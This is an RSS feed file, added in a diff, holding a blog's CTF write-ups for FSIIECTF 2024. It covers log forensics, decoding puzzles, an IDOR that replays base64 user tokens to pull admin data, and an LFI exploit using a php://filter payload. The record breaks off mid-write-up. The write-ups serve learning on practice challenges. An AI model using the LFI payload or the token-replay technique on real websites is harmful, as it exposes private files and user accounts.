@@ -1,0 +1,854 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>FSIIECTF 2024 on</title><link>https://qiaonpc.github.io/categories/fsiiectf-2024/</link><description>Recent content in FSIIECTF 2024 on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 08 Sep 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://qiaonpc.github.io/categories/fsiiectf-2024/index.xml" rel="self" type="application/rss+xml"/><item><title>Apache Logs</title><link>https://qiaonpc.github.io/post/apache-logs/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/apache-logs/</guid><description>&lt;h1 id="forensics-ctf-challenge-writeup">Forensics CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: Apache Logs&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 1&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Forensics&lt;/li>
+&lt;li>&lt;strong>Objective&lt;/strong>: Analyze the Apache log file to uncover and decode suspicious data.&lt;/li>
+&lt;/ul>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Log Analysis&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>The provided Apache log file is relatively short.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Upon reviewing the logs, identify a URL with &lt;strong>URL-encoded&lt;/strong> suspicious data.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/apache-logs/found%20url%20encoded.png"
+width="1433"
+height="286"
+srcset="https://qiaonpc.github.io/post/apache-logs/found%20url%20encoded_hud36002e879f66875a9519217911e17fa_40464_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/apache-logs/found%20url%20encoded_hud36002e879f66875a9519217911e17fa_40464_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Found URL Encoding"
+class="gallery-image"
+data-flex-grow="501"
+data-flex-basis="1202px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>URL Decoding&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Decode the URL using standard URL decoding techniques to reveal an ASCII representation of letters.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/apache-logs/decode%20url%20encoding.png"
+width="1405"
+height="737"
+srcset="https://qiaonpc.github.io/post/apache-logs/decode%20url%20encoding_hu880b7d47b08b0f2b1dbef2c706a387b1_112955_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/apache-logs/decode%20url%20encoding_hu880b7d47b08b0f2b1dbef2c706a387b1_112955_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Decode URL Encoding"
+class="gallery-image"
+data-flex-grow="190"
+data-flex-basis="457px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Conversion&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Convert the ASCII representation into readable text, which reveals the flag.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/apache-logs/flag.png"
+width="809"
+height="289"
+srcset="https://qiaonpc.github.io/post/apache-logs/flag_hucae165c9f7bab897570a7cb81e66df86_7120_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/apache-logs/flag_hucae165c9f7bab897570a7cb81e66df86_7120_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="279"
+data-flex-basis="671px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="flag">Flag
+&lt;/h2>&lt;p>FSIIECTF{XXXXXXXXXX}&lt;/p></description></item><item><title>ASCII Hunt</title><link>https://qiaonpc.github.io/post/ascii-hunt/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/ascii-hunt/</guid><description>&lt;h1 id="ascii-hunt-ctf-challenge-writeup">ASCII Hunt CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: ASCII Hunt&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 1&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Crypto&lt;/li>
+&lt;li>&lt;strong>Objective&lt;/strong>: Decode the flag from a given set of arrays using missing numbers.&lt;/li>
+&lt;/ul>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;p>To solve the &amp;ldquo;ASCII Hunt&amp;rdquo; challenge, follow these steps:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Initial Analysis&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>You are provided with a large Python array consisting of multiple sub-arrays.&lt;/li>
+&lt;li>Each sub-array has a length of 255, and there are 32 sub-arrays.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Understanding the Data&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Each sub-array likely represents a set of ASCII values.&lt;/li>
+&lt;li>Given that a flag is typically around 32 characters long, it is reasonable to assume that the 32 sub-arrays correspond to the characters in the flag.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Analyzing the Arrays&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Went back and forth to the description and eventually found that each sub-array should ideally contain all values from 0 to 255.&lt;/li>
+&lt;li>Identify that some values are missing from these arrays.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Finding Missing Values&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Write a script to find the missing values in each sub-array. This involves sorting the arrays and determining which numbers from 0 to 255 are absent.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">ast&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">file_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;enc.txt&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file_path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">file_contents&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">arrays&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ast&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">literal_eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file_contents&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">full_range&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">256&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">flags&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">array&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">arrays&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">array&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sort&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># Sort the array&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Find the missing numbers&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">missing&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">list&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">full_range&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nb">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">missing&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sort&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># Sort the missing numbers&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flags&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">missing&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Sorted Arrays: &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">arrays&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Missing Numbers: &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">char&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">char&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">]))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Constructing the Flag&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>The missing numbers in the arrays correspond to the ASCII values of the characters in the flag.&lt;/li>
+&lt;li>Convert these missing numbers to their ASCII characters to reconstruct the flag.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Implementing the Script&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Example Python script to find missing values:&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Flag Retrieval&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Run the script to find the missing numbers and convert them to characters.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The resulting string is the flag.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/ascii-hunt/flag.png"
+width="1395"
+height="171"
+srcset="https://qiaonpc.github.io/post/ascii-hunt/flag_hud9a9462d769b6855a970318c366f06ea_52133_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/ascii-hunt/flag_hud9a9462d769b6855a970318c366f06ea_52133_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="815"
+data-flex-basis="1957px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol></description></item><item><title>Auth Log</title><link>https://qiaonpc.github.io/post/auth-log/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/auth-log/</guid><description>&lt;h1 id="forensics-ctf-challenge-writeup">Forensics CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: Auth Log&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 1&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Forensics&lt;/li>
+&lt;li>&lt;strong>Objective&lt;/strong>: Answer five questions based on the provided authentication logs.&lt;/li>
+&lt;/ul>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Attack Type&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>By analyzing the logs, it becomes evident that there are multiple failed login attempts, indicating a &lt;strong>brute force attack&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/auth-log/brute%20force%20login.png"
+width="931"
+height="390"
+srcset="https://qiaonpc.github.io/post/auth-log/brute%20force%20login_huc39495ac7917608915afde1cb9b7bb16_67642_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/auth-log/brute%20force%20login_huc39495ac7917608915afde1cb9b7bb16_67642_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Brute Force Attack"
+class="gallery-image"
+data-flex-grow="238"
+data-flex-basis="572px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Protocol&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>The protocol used in the attack is &lt;strong>SSH&lt;/strong>, as seen in the logs.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Vulnerability Used&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>The attack involved privilege escalation, specifically related to &lt;strong>sudo&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/auth-log/sudo.png"
+width="1377"
+height="212"
+srcset="https://qiaonpc.github.io/post/auth-log/sudo_hue7795272f71a5027516fa988db9c1f7a_36333_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/auth-log/sudo_hue7795272f71a5027516fa988db9c1f7a_36333_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Sudo"
+class="gallery-image"
+data-flex-grow="649"
+data-flex-basis="1558px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Vulnerable Binary&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>There are command logs mentioning &lt;strong>openvpn&lt;/strong>, which is the vulnerable binary.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>MITRE Sub Technique ID&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>A search identified the relevant MITRE ID for this attack: &lt;strong>T1136.001&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/auth-log/persistence.png"
+width="1375"
+height="337"
+srcset="https://qiaonpc.github.io/post/auth-log/persistence_hua59122f5c56fe0749f09213e17087c98_58189_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/auth-log/persistence_hua59122f5c56fe0749f09213e17087c98_58189_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Persistence"
+class="gallery-image"
+data-flex-grow="408"
+data-flex-basis="979px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="flag">Flag
+&lt;/h2>&lt;p>FSIIECTF{bruteforce_ssh_sudo_openvpn_T1136.001}&lt;/p></description></item><item><title>Cyberchef</title><link>https://qiaonpc.github.io/post/cyberchef/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/cyberchef/</guid><description>&lt;h1 id="crypto-ctf-challenge-writeup">Crypto CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: Cyberchef&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 1&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Crypto&lt;/li>
+&lt;/ul>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>Simply use &lt;strong>CyberChef&lt;/strong> to analyze the input data, apply the appropriate decoding operations, and retrieve the flag.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/cyberchef/flag.png"
+width="1543"
+height="768"
+srcset="https://qiaonpc.github.io/post/cyberchef/flag_hue64c4c928e8434569f2aacd1efc08d83_55546_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/cyberchef/flag_hue64c4c928e8434569f2aacd1efc08d83_55546_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="200"
+data-flex-basis="482px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="flag">Flag
+&lt;/h2>&lt;p>FSIIECTF{XXXXXXXXXX}&lt;/p></description></item><item><title>IPORTE</title><link>https://qiaonpc.github.io/post/iporte/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/iporte/</guid><description>&lt;h1 id="iporte-ctf-challenge-writeup">IPORTE CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: IPORTE&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 1&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Web&lt;/li>
+&lt;li>&lt;strong>Objective&lt;/strong>: Exploit a vulnerability to retrieve information about other users, including the flag.&lt;/li>
+&lt;/ul>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;p>To solve the &amp;ldquo;IPORTE&amp;rdquo; challenge, follow these steps:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Initial Exploration&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>The challenge page provides functionality to register and log in.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Register an account to obtain a base64 encoded string.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/iporte/register%20for%20acc.png"
+width="985"
+height="496"
+srcset="https://qiaonpc.github.io/post/iporte/register%20for%20acc_hu6b581fb54e7b051a55046e8d170fa153_25521_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/iporte/register%20for%20acc_hu6b581fb54e7b051a55046e8d170fa153_25521_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Register for Account"
+class="gallery-image"
+data-flex-grow="198"
+data-flex-basis="476px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Decoding the Base64 String&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Decode the base64 encoded string received after registration.&lt;/li>
+&lt;li>The decoded string reveals your username and the registration date.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Exploiting the Information Retrieval Functionality&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Note that it’s possible to retrieve information about other users by using their base64 encoded strings.&lt;/li>
+&lt;li>You can send a POST request with a base64 encoded string to get details of other users.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Retrieving the Admin Information&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Obtain the base64 encoded string for the admin user.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Send a POST request with this encoded string to get the admin&amp;rsquo;s details.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/iporte/get%20admin%20base64%20string.png"
+width="1349"
+height="671"
+srcset="https://qiaonpc.github.io/post/iporte/get%20admin%20base64%20string_hu3e3fa270613a9075feff8b988eacb3f7_35240_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/iporte/get%20admin%20base64%20string_hu3e3fa270613a9075feff8b988eacb3f7_35240_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Admin String"
+class="gallery-image"
+data-flex-grow="201"
+data-flex-basis="482px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Getting the Flag&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Retrieve the flag from the admin&amp;rsquo;s information or as part of the response to the request.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/iporte/flag.png"
+width="1306"
+height="458"
+srcset="https://qiaonpc.github.io/post/iporte/flag_huca19786772bcb5d341323288f6379590_75588_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/iporte/flag_huca19786772bcb5d341323288f6379590_75588_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="285"
+data-flex-basis="684px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol></description></item><item><title>Kakegura Secret</title><link>https://qiaonpc.github.io/post/kakegura-secret/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/kakegura-secret/</guid><description>&lt;h1 id="kakegura-secret-ctf-challenge-writeup">Kakegura Secret CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: Kakegura Secret&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 1&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Web&lt;/li>
+&lt;li>&lt;strong>Objective&lt;/strong>: Exploit a Local File Inclusion (LFI) vulnerability to retrieve the flag.&lt;/li>
+&lt;/ul>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;p>To solve the &amp;ldquo;Kakegura Secret&amp;rdquo; challenge, follow these steps:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Initial Exploration&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>The website appears to be a PHP-based application.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Clicking on the &amp;ldquo;Flag&amp;rdquo; page does not display the flag directly.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/kakegura-secret/flag%20defnied.png"
+width="951"
+height="271"
+srcset="https://qiaonpc.github.io/post/kakegura-secret/flag%20defnied_hufdc796fd020784bd321285376a6495fc_23448_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/kakegura-secret/flag%20defnied_hufdc796fd020784bd321285376a6495fc_23448_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag Denied"
+class="gallery-image"
+data-flex-grow="350"
+data-flex-basis="842px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Identifying the Vulnerability&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>By clicking around the website, you can suspect the presence of a Local File Inclusion (LFI) vulnerability, possibly involving PHP filters.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The way the page renders suggests that files may be included dynamically.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/kakegura-secret/potential%20lfi.png"
+width="874"
+height="395"
+srcset="https://qiaonpc.github.io/post/kakegura-secret/potential%20lfi_hua73ba821c124fd04027a666ce2cecefa_76673_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/kakegura-secret/potential%20lfi_hua73ba821c124fd04027a666ce2cecefa_76673_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Potential LFI"
+class="gallery-image"
+data-flex-grow="221"
+data-flex-basis="531px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Exploiting LFI with PHP Filters&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Use PHP filters to exploit the LFI vulnerability to read sensitive files.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Example payload:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">page&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">php&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">filter&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">convert&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">base64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">encode&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">resource&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>By leveraging the filter to base64 encode the content of files, retrieve the contents of important files, including the one containing the flag.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/kakegura-secret/output%20of%20php%20filter.png"
+width="1683"
+height="502"
+srcset="https://qiaonpc.github.io/post/kakegura-secret/output%20of%20php%20filter_huc0926598aa7285f729bb5d7fef5516d6_116376_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/kakegura-secret/output%20of%20php%20filter_huc0926598aa7285f729bb5d7fef5516d6_116376_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Output of PHP Filter"
+class="gallery-image"
+data-flex-grow="335"
+data-flex-basis="804px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Flag Retrieval&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Successfully exploit the LFI to access the flag and decode it.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/kakegura-secret/flag.png"
+width="1311"
+height="668"
+srcset="https://qiaonpc.github.io/post/kakegura-secret/flag_hu760c13288a1c7fe359fc10560a88304f_175640_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/kakegura-secret/flag_hu760c13288a1c7fe359fc10560a88304f_175640_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="196"
+data-flex-basis="471px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
